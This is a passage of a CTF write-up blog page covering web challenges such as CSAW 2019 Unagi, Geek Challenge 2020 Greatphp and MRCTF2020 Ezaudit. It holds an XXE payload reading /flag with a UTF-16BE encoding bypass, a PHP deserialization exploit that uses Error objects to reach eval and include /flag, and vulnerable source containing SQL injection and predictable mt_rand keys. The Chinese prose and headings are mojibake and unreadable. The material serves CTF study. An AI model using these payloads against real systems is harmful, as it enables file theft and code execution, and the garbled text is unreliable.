</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>roam1<span style=color:#f92672>[]=</span>1&amp;roam2<span style=color:#f92672>[]=</span><span style=color:#ae81ff>2</span>
</span></span></code></pre></div><h2 id=csawqual-2019web_unagi>[CSAWQual 2019]Web_Unagi</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#39;1.0&#39;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE users [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34; &gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;users&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;user&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;username&gt;</span>gg<span style=color:#f92672>&lt;/username&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;password&gt;</span>passwd1<span style=color:#f92672>&lt;/password&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;name&gt;</span>ggg<span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;email&gt;</span>alice@fakesite.com<span style=color:#f92672>&lt;/email&gt;</span>  
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;group&gt;</span>CSAW2019<span style=color:#f92672>&lt;/group&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;intro&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/intro&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/user&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;user&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;username&gt;</span>bob<span style=color:#f92672>&lt;/username&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;password&gt;</span>passwd2<span style=color:#f92672>&lt;/password&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;name&gt;</span> Bob<span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;email&gt;</span>bob@fakesite.com<span style=color:#f92672>&lt;/email&gt;</span>  
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;group&gt;</span>CSAW2019<span style=color:#f92672>&lt;/group&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;intro&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/intro&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/user&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/users&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>â”Œâ”€â”€<span style=color:#f92672>(</span>orangeã‰¿Coyano<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/mnt/c/Users/0raN9e/Desktop/ä¸€å¥è¯æœ¨é©¬<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>â””â”€$ cat 1.xml | iconv -f UTF-8 -t UTF-16BE &gt; 2.xml
</span></span></code></pre></div><h2 id=æå®¢å¤§æŒ‘æˆ˜-2020greatphp>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SYCLOVER</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $syc;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $lover;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>( ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span> <span style=color:#f92672>!=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lover</span>) <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>md5</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lover</span>)) <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>sha1</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>)<span style=color:#f92672>===</span> <span style=color:#a6e22e>sha1</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lover</span>)) ){
</span></span><span style=display:flex><span>           <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/\&lt;\?php|\(|\)|</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>|\&#39;/&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>, $match)){
</span></span><span style=display:flex><span>               <span style=color:#66d9ef>eval</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>);
</span></span><span style=display:flex><span>           } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>               <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Try Hard !!&#34;</span>);
</span></span><span style=display:flex><span>           }
</span></span><span style=display:flex><span>           
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;great&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#39;great&#39;</span>]);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>ç±»å¼ºæ¯”è¾ƒçš„ç»•è¿‡ï¼Œä¸»è¦æ˜¯è¦è§¦å‘<code>__wakeup</code>å¯ä»¥ä½¿ç”¨errorï¼Œå–åè¯»å–<code>/flag</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);    
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SYCLOVER</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $syc;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $lover;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>( ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span> <span style=color:#f92672>!=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lover</span>) <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>md5</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lover</span>)) <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>sha1</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>)<span style=color:#f92672>===</span> <span style=color:#a6e22e>sha1</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lover</span>)) ){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/\&lt;\?php|\(|\)|</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>|\&#39;/&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>, $match)){
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>eval</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span>);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Try Hard !!&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;?&gt;&lt;?=include~&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>urldecode</span>(<span style=color:#e6db74>&#34;%D0%99%93%9E%98&#34;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;?&gt;&#34;</span>;
</span></span><span style=display:flex><span>$a<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Error</span>($str,<span style=color:#ae81ff>1</span>);$b<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Error</span>($str,<span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>$c <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>SYCLOVER</span>();
</span></span><span style=display:flex><span>$c<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>syc</span> <span style=color:#f92672>=</span> $a;
</span></span><span style=display:flex><span>$c<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lover</span> <span style=color:#f92672>=</span> $b;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span>(<span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($c)));
</span></span></code></pre></div><h2 id=mrctf2020ezaudit>[MRCTF2020]Ezaudit</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-type:text/html; charset=utf-8&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;login&#39;</span>])){
</span></span><span style=display:flex><span>    $username <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>];
</span></span><span style=display:flex><span>    $password <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;password&#39;</span>];
</span></span><span style=display:flex><span>    $Private_key <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;Private_key&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (($username <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>) <span style=color:#f92672>||</span> ($password <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>) <span style=color:#f92672>||</span>($Private_key <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢
</span></span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;refresh:2; url=login.html&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($Private_key <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;*************&#39;</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;refresh:2; url=login.html&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($Private_key <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;************&#39;</span>){
</span></span><span style=display:flex><span>        $getuser <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;</span><span style=color:#e6db74>$password</span><span style=color:#e6db74>&#39;&#34;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;;&#39;</span>; 
</span></span><span style=display:flex><span>        $link<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_connect</span>(<span style=color:#e6db74>&#34;localhost&#34;</span>,<span style=color:#e6db74>&#34;root&#34;</span>,<span style=color:#e6db74>&#34;root&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#e6db74>&#34;test&#34;</span>,$link);
</span></span><span style=display:flex><span>        $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($getuser);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span>($row<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_fetch_assoc</span>($result)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;tr&gt;&lt;td&gt;&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#34;username&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/td&gt;&lt;td&gt;&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#34;flag&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/td&gt;&lt;td&gt;&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#75715e>// genarate public_key 
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>public_key</span>($length <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span>) {
</span></span><span style=display:flex><span>    $strings1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>;
</span></span><span style=display:flex><span>    $public_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ( $i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $length; $i<span style=color:#f92672>++</span> )
</span></span><span style=display:flex><span>    $public_key <span style=color:#f92672>.=</span> <span style=color:#a6e22e>substr</span>($strings1, <span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>strlen</span>($strings1) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $public_key;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>//genarate private_key
</span></span></span><span style=display:flex><span>  <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>private_key</span>($length <span style=color:#f92672>=</span> <span style=color:#ae81ff>12</span>) {
</span></span><span style=display:flex><span>    $strings2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>;
</span></span><span style=display:flex><span>    $private_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ( $i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $length; $i<span style=color:#f92672>++</span> )
</span></span><span style=display:flex><span>    $private_key <span style=color:#f92672>.=</span> <span style=color:#a6e22e>substr</span>($strings2, <span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>strlen</span>($strings2) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $private_key;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  $Public_key <span style=color:#f92672>=</span> <span style=color:#a6e22e>public_key</span>();
</span></span><span style=display:flex><span>  <span style=color:#75715e>//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???
</span></span></span></code></pre></div></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">ç›®å½•</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>ç›®å½•</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">Ã—</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><ul><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019easysql>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019havefun>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</a></li><li><a href=#hctf-2018warmup>[HCTF 2018]WarmUp</a></li><li><a href=#actf2020-æ–°ç”Ÿèµ›include>[ACTF2020 æ–°ç”Ÿèµ›]Include</a></li><li><a href=#actf2020-æ–°ç”Ÿèµ›exec>[ACTF2020 æ–°ç”Ÿèµ›]Exec</a></li><li><a href=#gxyctf2019ping-ping-ping>[GXYCTF2019]Ping Ping Ping</a><ul><li><a href=#è§£é¢˜1>è§£é¢˜1</a></li><li><a href=#è§£é¢˜2>è§£é¢˜2</a></li><li><a href=#è§£é¢˜3>è§£é¢˜3</a></li></ul></li><li><a href=#suctf-2019easysql>[SUCTF 2019]EasySQL</a><ul><li><a href=#è§£é¢˜1-1>è§£é¢˜1</a></li><li><a href=#è§£é¢˜2-1>è§£é¢˜2</a></li></ul></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019lovesql>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</a></li><li><a href=#å¼ºç½‘æ¯-2019éšä¾¿æ³¨>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</a><ul><li><a href=#è§£é¢˜1-2>è§£é¢˜1</a></li><li><a href=#è§£é¢˜2-2>è§£é¢˜2</a></li><li><a href=#è§£é¢˜3-1>è§£é¢˜3</a></li></ul></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019secret-file>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019http>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019upload>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019knife>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</a></li><li><a href=#actf2020-æ–°ç”Ÿèµ›upload>[ACTF2020 æ–°ç”Ÿèµ›]Upload</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019babysql>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019php>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</a></li><li><a href=#actf2020-æ–°ç”Ÿèµ›backupfile>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</a></li><li><a href=#roarctf-2019easy-calc>[RoarCTF 2019]Easy Calc</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019buyflag>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</a></li><li><a href=#bjdctf2020easy-md5>[BJDCTF2020]Easy MD5</a></li><li><a href=#hctf-2018admin>[HCTF 2018]admin</a><ul><li><a href=#è§£é¢˜1-3>è§£é¢˜1</a></li><li><a href=#è§£é¢˜2-3>è§£é¢˜2</a></li><li><a href=#è§£é¢˜3-2>è§£é¢˜3</a></li></ul></li><li><a href=#mrctf2020ä½ ä¼ ä½ å‘¢>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</a></li><li><a href=#æŠ¤ç½‘æ¯-2018easy_tornado>[æŠ¤ç½‘æ¯ 2018]easy_tornado</a></li><li><a href=#zjctf-2019nizhuansiwei>[ZJCTF 2019]NiZhuanSiWei</a></li><li><a href=#mrctf2020ez_bypass>[MRCTF2020]Ez_bypass</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019hardsql>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</a></li><li><a href=#ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a></li><li><a href=#gxyctf2019babyupload>[GXYCTF2019]BabyUpload</a></li><li><a href=#suctf-2019checkin>[SUCTF 2019]CheckIn</a></li><li><a href=#gxyctf2019babysqli>[GXYCTF2019]BabySQli</a></li><li><a href=#gyctf2020blacklist>[GYCTF2020]Blacklist</a></li><li><a href=#ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</a></li><li><a href=#roarctf-2019easy-java>[RoarCTF 2019]Easy Java</a></li><li><a href=#ç½‘é¼æ¯-2018fakebook>[ç½‘é¼æ¯ 2018]Fakebook</a><ul><li><a href=#è§£é¢˜1-4>è§£é¢˜1</a></li><li><a href=#è§£é¢˜2-4>è§£é¢˜2</a></li></ul></li><li><a href=#bsidescf-2020had-a-bad-day>[BSidesCF 2020]Had a bad day</a></li><li><a href=#ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</a><ul><li><a href=#è§£é¢˜1-5>è§£é¢˜1</a></li><li><a href=#è§£é¢˜2-5>è§£é¢˜2</a></li></ul></li><li><a href=#bjdctf2020the-mystery-of-ip>[BJDCTF2020]The mystery of ip</a></li><li><a href=#bjdctf2020zjctfä¸è¿‡å¦‚æ­¤>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</a></li><li><a href=#buuctf-2018online-tool>[BUUCTF 2018]Online Tool</a></li><li><a href=#gxyctf2019ç¦æ­¢å¥—å¨ƒ>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</a></li><li><a href=#nctf2019fake-xml-cookbook>[NCTF2019]Fake XML cookbook</a></li><li><a href=#gwctf-2019æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</a></li><li><a href=#bjdctf2020mark-loves-cat>[BJDCTF2020]Mark loves cat</a></li><li><a href=#wustctf2020æœ´å®æ— å>[WUSTCTF2020]æœ´å®æ— å</a></li><li><a href=#bjdctf2020cookie-is-so-stable>[BJDCTF2020]Cookie is so stable</a></li><li><a href=#mrctf2020ezpop>[MRCTF2020]Ezpop</a></li><li><a href=#å®‰æ´µæ¯-2019easy_web>[å®‰æ´µæ¯ 2019]easy_web</a></li><li><a href=#mrctf2020pywebsite>[MRCTF2020]PYWebsite</a></li><li><a href=#westernctf2018shrine>[WesternCTF2018]shrine</a></li><li><a href=#å®‰æ´µæ¯-2019easy_serialize_php>[å®‰æ´µæ¯ 2019]easy_serialize_php</a></li><li><a href=#å¼ºç½‘æ¯-2019é«˜æ˜çš„é»‘å®¢>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</a></li><li><a href=#ç½‘é¼æ¯-2020-æœ±é›€ç»„nmap>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</a></li><li><a href=#npuctf2020readlezphp>[NPUCTF2020]ReadlezPHP</a></li><li><a href=#asis-2019unicorn-shop>[ASIS 2019]Unicorn shop</a></li><li><a href=#ciscn2019-åä¸œå—èµ›åŒºweb11>[CISCN2019 åä¸œå—èµ›åŒº]Web11</a></li><li><a href=#swpu2019web1>[SWPU2019]Web1</a></li><li><a href=#bsidescf-2019kookie>[BSidesCF 2019]Kookie</a></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019finalsql>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</a></li><li><a href=#bsidescf-2019futurella>[BSidesCF 2019]Futurella</a></li><li><a href=#ciscn-2019-åˆèµ›love-math>[CISCN 2019 åˆèµ›]Love Math</a><ul><li><a href=#0x01>0x01</a></li><li><a href=#0x02>0x02</a></li><li><a href=#0x03>0x03</a></li></ul></li><li><a href=#æå®¢å¤§æŒ‘æˆ˜-2019rce-me>æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</a></li><li><a href=#de1ctf-2019ssrf-me>[De1CTF 2019]SSRF Me</a></li><li><a href=#bjdctf2020easysearch>[BJDCTF2020]EasySearch</a></li><li><a href=#gyctf2020flaskapp>[GYCTF2020]FlaskApp</a><ul><li><a href=#0x01-1>0x01</a></li><li><a href=#0x02-1>0x02</a></li></ul></li><li><a href=#wustctf2020é¢œå€¼æˆç»©æŸ¥è¯¢>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</a></li><li><a href=#fbctf2019rceservice>[FBCTF2019]RCEService</a><ul><li><a href=#0x01-2>0x01</a></li><li><a href=#0x02-2>0x02</a></li></ul></li><li><a href=#suctf-2019pythonginx>[SUCTF 2019]Pythonginx</a></li><li><a href=#0ctf-2016piapiapia>[0CTF 2016]piapiapia</a></li><li><a href=#zer0pts2020can-you-guess-it>[Zer0pts2020]Can you guess it?</a></li><li><a href=#mrctf2020å¥—å¨ƒ>[MRCTF2020]å¥—å¨ƒ</a></li><li><a href=#cscctf-2019-qualflasklight>[CSCCTF 2019 Qual]FlaskLight</a></li><li><a href=#watevrctf-2019cookie-store>[watevrCTF-2019]Cookie Store</a></li><li><a href=#wustctf2020cv-maker>[WUSTCTF2020]CV Maker</a></li><li><a href=#ciscn2019-ååŒ—èµ›åŒº-day1-web2ikun>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</a></li><li><a href=#åˆ†æ>åˆ†æ</a></li><li><a href=#çº¢æ˜è°·ctf-2021write_shell>[çº¢æ˜è°·CTF 2021]write_shell</a></li><li><a href=#rctf2015easysql>[RCTF2015]EasySQL</a></li><li><a href=#gwctf-2019æ¯ç‡¥çš„æŠ½å¥–>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</a></li><li><a href=#nctf2019true-xml-cookbook>[NCTF2019]True XML cookbook</a></li><li><a href=#ciscn2019-ååŒ—èµ›åŒº-day1-web5cyberpunk>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</a></li><li><a href=#ç½‘é¼æ¯-2020-ç™½è™ç»„picdown>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</a><ul><li><a href=#éé¢„æœŸ>éé¢„æœŸ</a></li><li><a href=#é¢„æœŸ>é¢„æœŸ</a></li></ul></li><li><a href=#hitcon-2017ssrfme>[HITCON 2017]SSRFme</a><ul><li><a href=#æ–¹æ³•1>æ–¹æ³•1</a></li><li><a href=#æ–¹æ³•2>æ–¹æ³•2</a></li></ul></li><li><a 